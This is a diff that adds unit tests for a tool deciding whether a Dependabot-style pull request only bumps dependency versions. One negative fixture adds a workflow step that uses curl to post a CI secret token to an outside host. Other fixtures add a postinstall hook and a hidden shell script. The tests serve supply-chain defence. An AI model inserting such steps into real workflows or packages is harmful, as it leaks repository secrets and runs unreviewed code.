@@ -118,3 +118,32 @@ test("accepts AI responses returned as a parsed object or as text", async () => 
   assert.deepEqual(await aiReview(asText, "t", "diff"), { risk: "medium", reason: "ci change" });
   assert.equal(await aiReview(broken, "t", "diff"), null);
 });
+
+// ---- Dependabot version bumps ----
+import { isVersionOnlyChange } from "./rules.ts";
+const wfBump: ChangedFile = { filename: ".github/workflows/ci.yml", status: "modified", patch: [
+  "-        uses: step-security/harden-runner@1d88384fd173af6ecb012dfd0264a306b711241a # v2.22.4",
+  "+        uses: step-security/harden-runner@2a9d1e3f5b7c9d1e3f5a7b9c1d3e5f7a9b1c3d5e # v2.23.0",
+  "-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1",
+  "+      - uses: actions/checkout@4e4d53f6bbd6cb916926e47cb31d290ab1c4f8a2 # v7.1.0",
+].join("\n") };
+
+test("a pure action-version bump (like .github#196) is version-only", () => {
+  assert.equal(isVersionOnlyChange([wfBump]), true);
+});
+
+test("npm bumps: manifest version lines + lockfile are version-only", () => {
+  assert.equal(isVersionOnlyChange([
+    { filename: "package.json", status: "modified", patch: `-    "wrangler": "^4.103.0",\n+    "wrangler": "^4.158.0",` },
+    { filename: "package-lock.json", status: "modified", patch: "+ anything goes in a lockfile" },
+  ]), true);
+});
+
+test("a 'dependabot' PR that adds anything else is NOT version-only", () => {
+  const sneaky: ChangedFile = { ...wfBump, patch: wfBump.patch + "\n+      - run: curl -d \"${{ secrets.TOKEN }}\" https://x.io" };
+  assert.equal(isVersionOnlyChange([sneaky]), false);
+  assert.equal(isVersionOnlyChange([{ filename: "package.json", status: "modified", patch: `+    "postinstall": "node x.js",` }]), false);
+  assert.equal(isVersionOnlyChange([wfBump, { filename: ".ci-abc123.sh", status: "added", patch: "+#!/bin/sh" }]), false);
+  assert.equal(isVersionOnlyChange([{ filename: "src/app.ts", status: "modified", patch: "+export const x = 1;" }]), false);
+  assert.equal(isVersionOnlyChange([{ filename: "package-lock.json", status: "modified", patch: "+x" }].slice(0, 0)), false);
+});
